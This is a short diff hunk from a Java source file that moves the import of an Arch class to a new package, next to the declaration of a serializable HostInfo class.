@@ -26,7 +26,7 @@ import java.util.HashMap;
 import javax.swing.ImageIcon;
 
 import subterranean.crimson.universal.Logger;
-import subterranean.crimson.universal.containers.Arch;
+import subterranean.crimson.universal.NativeSystem.Arch;
 
 public class HostInfo implements Serializable {
 
